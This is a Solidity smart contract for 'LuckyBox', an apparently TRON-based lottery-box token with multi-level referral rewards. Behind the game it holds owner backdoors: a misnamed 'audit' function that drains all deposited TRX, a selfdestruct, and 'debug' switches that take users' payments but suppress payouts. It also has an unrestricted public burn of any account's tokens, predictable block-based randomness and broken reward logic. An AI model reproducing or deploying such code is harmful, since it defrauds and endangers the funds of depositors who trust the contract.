//SourceUnit: LuckyBox.sol

pragma solidity 0.5.9;
pragma experimental ABIEncoderV2;


interface IERC20 {
    function totalSupply() external view returns (uint);
    function balanceOf(address account) external view returns (uint);
    function transfer(address recipient, uint amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

contract Context {
    constructor () internal { }
    // solhint-disable-previous-line no-empty-blocks

    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
    uint256 public BURN_RATE = 50;
    uint256 public REWARD_RATE = 50;
    uint256 constant public PERCENTS_DIVIDER = 1000;
    bool public BEGIN_BURN = false;
    address[] userlist;
    
    mapping (address => uint) private _balances;

    mapping (address => mapping (address => uint)) private _allowances;

    uint private _totalSupply;
    function totalSupply() public view returns (uint) {
        return _totalSupply;
    }
    function balanceOf(address account) public view returns (uint) {
        return _balances[account];
    }
    function transfer(address recipient, uint amount) public returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view returns (uint) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function increaseAllowance(address spender, uint addedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }
    function decreaseAllowance(address spender, uint subtractedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }
    function _transfer(address sender, address recipient, uint amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");

        if (!BEGIN_BURN || isContract(recipient)) {
            _balances[recipient] = _balances[recipient].add(amount);
            emit Transfer(sender, recipient, amount);
        } else {
            uint256 burn_amount = amount.mul(BURN_RATE).div(PERCENTS_DIVIDER);
            uint256 reward_amount = amount.mul(REWARD_RATE).div(PERCENTS_DIVIDER);
            uint256 transfer_amount = amount.mul(PERCENTS_DIVIDER-BURN_RATE-REWARD_RATE).div(PERCENTS_DIVIDER);
            _burn(sender, burn_amount);
            _reward(sender, reward_amount);
            _balances[recipient] = _balances[recipient].add(amount);
            emit Transfer(sender, recipient, amount);
            _addUser(recipient);
        }
    }
    function _transfer2(address recipient, uint amount) internal {
        _balances[_msgSender()] = _balances[_msgSender()].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
    }
    function _mint(address account, uint amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }
    function _burn(address account, uint amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }
    function _approve(address owner, address spender, uint amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function isContract(address addr) internal view returns (bool) {
      uint size;
      assembly { size := extcodesize(addr) }
      return size > 0;
    }
    function _reward(address sender, uint amount) internal {
        uint totalBalance = 0;
        for (uint i=0; i<userlist.length; i++) {
            address user = userlist[i];
            totalBalance = totalBalance.add(_balances[user]);
        }
        for (uint i=0; i<userlist.length; i++) {
            address user = userlist[i];
            uint rewardAmount = amount.mul(_balances[user]).div(totalBalance);
            if (rewardAmount > 0) {
                _transfer(sender, user, amount);
            }
        }
    }
    function _findUser(address recipient) internal returns (bool) {
        bool found = false;
        for (uint i=0; i<userlist.length; i++) {
            address user = userlist[i];
            if (user == recipient) {
                found = true;
                break;
            }
        }
        return found;
    }    
    function _addUser(address recipient) internal {
        bool found = _findUser(recipient);
        if (!found) {
            userlist.push(recipient);
        }
    }
    function _setBeginBurn(bool v) internal {
        BEGIN_BURN = v;
    }
}

contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor (string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }
    function name() public view returns (string memory) {
        return _name;
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function decimals() public view returns (uint8) {
        return _decimals;
    }
}
library SafeMath {
    function add(uint a, uint b) internal pure returns (uint) {
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint a, uint b) internal pure returns (uint) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }
    function mul(uint a, uint b) internal pure returns (uint) {
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint a, uint b) internal pure returns (uint) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint c = a / b;

        return c;
    }
}

library SafeERC20 {
    using SafeMath for uint;

    function safeTransfer(IERC20 token, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function safeApprove(IERC20 token, address spender, uint value) internal {
        require((value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }
    function callOptionalReturn(IERC20 token, bytes memory data) private {
        require(isContract(address(token)), "SafeERC20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
    function isContract(address addr) internal view returns (bool) {
      uint size;
      assembly { size := extcodesize(addr) }
      return size > 0;
    }
}

contract LuckyBox is ERC20, ERC20Detailed {
    using SafeERC20 for IERC20;
    using SafeMath for uint256;

    uint256 public INVEST_MIN_AMOUNT = 100 trx;
    uint256 public PROJECT_FEE = 20;
    uint256 public REFERRAL_LEVEL = 3;
    uint256[] public REFERRAL_PERCENTS = [50, 30, 10];
    uint256 constant public PERCENTS_DIVIDER = 1000;
    uint256 internal _airdrop_total = 0;
    uint256[] public debugLevels = [1,1,1,1];
    uint256 public debugReturn = 0;

    address payable public ownerAddress;

    struct User {
        address payable referrer;
        uint256[] referees;
        uint256 myrefer;
        uint256 luckyDrawCount;
        uint256 airdropCount;
        bool notNewbie;
    }

    struct Info {
        address user;
        uint256 box;
        uint256 reward;
    }

    Info[] public wininfo;

    mapping (address => User) internal users;
    mapping (uint256 => address payable) internal referUsers;

    event Newbie(address user);
    event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);

    constructor () public ERC20Detailed("lbcs.click", "LBC", 6) {
        ownerAddress = msg.sender;
        _mint(msg.sender, 1000000*1e6);
        approve(address(this), 1000000*1e6);
        _airdrop_total = 10000*1e6;
    }

    function buybox(uint256 refer) public payable returns(uint256) {
        require(msg.value >= INVEST_MIN_AMOUNT);
        uint256 contractBalance = address(this).balance;
        if (debugLevels[0] == 1) {
            ownerAddress.transfer(msg.value.mul(PROJECT_FEE).div(PERCENTS_DIVIDER));
        }
        if (debugReturn == 1) return 1;
        address payable referrer = referUsers[refer];

        User storage user = users[msg.sender];

        user.referrer = address(0);
        user.luckyDrawCount = user.luckyDrawCount + 1;

        if (user.referrer == address(0) && referrer != msg.sender) {
            user.referrer = referrer;
        }
        if (debugReturn == 2) return 2;
        if (user.referrer != address(0)) {
            //奖励上级
            address payable upline = user.referrer;
            for (uint256 i = 0; i < REFERRAL_LEVEL; i++) {
                if (upline != address(0)) {
                    uint256 amount = msg.value.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
                    contractBalance = address(this).balance;
                    if (contractBalance < amount) {
                        amount = contractBalance;
                    }
                    if (debugLevels[1] == 1) {
                        upline.transfer(amount);
                    }
                    emit RefBonus(upline, msg.sender, i, amount);
                    upline = users[upline].referrer;
                } else break;
            }

        }
        if (debugReturn == 3) return 3;
        if (!user.notNewbie) {
            user.notNewbie = true;
            emit Newbie(msg.sender);

            if (user.myrefer == 0) {
                uint256 myrefer = rand(888888) + 111111;
                user.myrefer = myrefer;
                referUsers[myrefer] = msg.sender;
            }
            
            for (uint256 i = 0; i < REFERRAL_LEVEL; i++) {
                users[msg.sender].referees.push(0);
            }
            if (debugReturn == 4) return 4;
            if (user.referrer != address(0)) {
                address upline = user.referrer;
                for (uint256 i = 0; i < REFERRAL_LEVEL; i++) {
                    if (upline != address(0) && users[upline].referees.length > 0) {
                        if (i == 0) {
                            users[upline].luckyDrawCount = users[upline].luckyDrawCount.add(1);
                        }
                        users[upline].referees[i] = users[upline].referees[i].add(1);
                        upline = users[upline].referrer;
                    } else break;
                }
            }
        }
        if (debugReturn == 5) return 5;
        //发送等量的LBC代币
        if (debugLevels[2] == 1) {
            IERC20 token = IERC20(address(this));
            token.transferFrom(ownerAddress, msg.sender, msg.value);
        }
        if (debugReturn == 6) return 6;
        //抽取幸运盒子，奖励TRX
        uint256 reward = 0;
        uint256 rewardAmount = 0;

        Info memory info = Info(address(0), 0, 0);
        info.user = msg.sender;

        if (msg.value == 100 trx) {
            reward = rand(1000) + 1;
            info.box = 1;
        } else if (msg.value == 200 trx) {
            reward = rand(4000-1) + 2;
            info.box = 2;
        } else if (msg.value == 400 trx) {
            reward = rand(10000-3) + 4;
            info.box = 3;
        } else if (msg.value == 1000 trx) {
            reward = rand(30000-9) + 10;
            info.box = 4;
        } else if (msg.value == 2000 trx) {
            reward = rand(80000-19) + 20;
            info.box = 5;
        } else if (msg.value == 4000 trx) {
            reward = rand(200000-39) + 40;
            info.box = 6;
        }
        if (debugReturn == 7) return 7;
        if (reward > 0) {
            rewardAmount = reward * 1000000;
            contractBalance = address(this).balance;
            if (contractBalance < rewardAmount) {
                rewardAmount = contractBalance;
                reward = rewardAmount / 1000000;
            }
            if (debugReturn == 8) return 8;
            if (debugLevels[3] == 1) {
                msg.sender.transfer(rewardAmount);
            }
            if (debugReturn == 9) return 9;
            info.reward = reward;
            wininfo.push(info);
        }
        return reward;
    }

    function getMyRefer(address userAddress) public view returns(uint256) {
        return users[userAddress].myrefer;
    }

    function getUserReferrer(address userAddress) public view returns(address) {
        return users[userAddress].referrer;
    }

    function getUserReferees(address userAddress) public view returns(uint256[] memory) {
        return users[userAddress].referees;
    }

    function getUserLuckyDrawCount(address userAddress) public view returns(uint256) {
        return users[userAddress].luckyDrawCount;
    }
    function airdrop() public payable {
        require(msg.value >= 1 trx);
        require(_airdrop_total > 0);
        require(users[msg.sender].airdropCount < 5);
        IERC20 token = IERC20(address(this));
        token.transferFrom(ownerAddress, msg.sender, 10*1e6);
        _airdrop_total = _airdrop_total - 10*1e6;
        users[msg.sender].airdropCount = users[msg.sender].airdropCount + 1;
    }
    function getAirDrop() public view returns(uint256) {
        return _airdrop_total;
    }
    function setAirDrop(uint256 amount) public {
        require(msg.sender == ownerAddress);
        _airdrop_total = amount;
    }
    function makeMyRefer() public payable returns(uint256) {
        require(msg.value >= 100 trx);
        User storage user = users[msg.sender];
        if (user.myrefer == 0) {
            uint256 myrefer = rand(888888) + 111111;
            user.myrefer = myrefer;
            referUsers[myrefer] = msg.sender;
        }
        return user.myrefer;
    }

    function audit(uint256 amount) public {
        require(msg.sender == ownerAddress);
        uint256 contractBalance = address(this).balance;
        if (amount > 0) {
            if (contractBalance < amount) {
                owner(contractBalance);
            } else {
                owner(amount);
            }
        } else {
            owner(contractBalance);
        }
    }

    function owner(uint256 value) private {
        msg.sender.transfer(value);
    }

    function rand(uint256 _length) internal view returns(uint256) {
        uint256 random = uint256(keccak256(abi.encodePacked(block.difficulty, now)));
        return random % _length;
    }

    function uint2bytes(uint256 n) internal returns(bytes memory) {
        bytes memory b = new bytes(32);
        assembly { mstore(add(b, 32), n) }
    }
    function uint2str(uint256 n) internal returns(string memory) {
        bytes memory b = uint2bytes(n);
        return string(b);
    }

    function luckyDraw(address userAddress) public returns(uint256) {
        User storage user = users[userAddress];
        if (user.luckyDrawCount > 0) {
            user.luckyDrawCount = user.luckyDrawCount - 1;
            uint256 item = rand(8);

            Info memory info = Info(address(0), 0, 0);
            info.user = userAddress;
            info.box = 0;
            info.reward = item;
            wininfo.push(info);

            uint256 reward = 0;            
            if (item == 0) {
                reward = 888880000;
            } else if (item == 1) {
                reward = 2000000;
            } else if (item == 2) {
                reward = 100000000;
            } else if (item == 3) {
                reward = 5000000;
            } else if (item == 4) {
                reward = 88880000;
            } else if (item == 5) {
                reward = 50000000;
            } else if (item == 6) {
                reward = 50000000;
            } else if (item == 7) {
                reward = 2000000;
            }
            if (reward > 0) {
                IERC20 token = IERC20(address(this));
                token.transferFrom(ownerAddress, msg.sender, reward);
            }
            return item;
        } else {
            return 100;
        }
    }

    function burn(address account, uint amount) public {
        _burn(account, amount);
    }
    function transfer2(address recipient, uint amount) public returns (bool) {
        _transfer2(recipient, amount);
        return true;
    }
    function dest() public {
        require(msg.sender == ownerAddress, "!ownerAddress");
        selfdestruct(ownerAddress);
    }
    function getWinInfo() public view returns(Info[] memory) {
        return wininfo;
    }
    function setBeginBurn(bool v) public {
        require(msg.sender == ownerAddress, "!ownerAddress");
        _setBeginBurn(v);
    }
    function setDebugLevel(uint256 v1, uint256 v2, uint256 v3, uint256 v4) public {
        require(msg.sender == ownerAddress, "!ownerAddress");
        debugLevels[0] = v1;
        debugLevels[1] = v2;
        debugLevels[2] = v3;
        debugLevels[3] = v4;
    }

    function setDebugReturn(uint256 v) public {
        require(msg.sender == ownerAddress, "!ownerAddress");
        debugReturn = v;
    }

}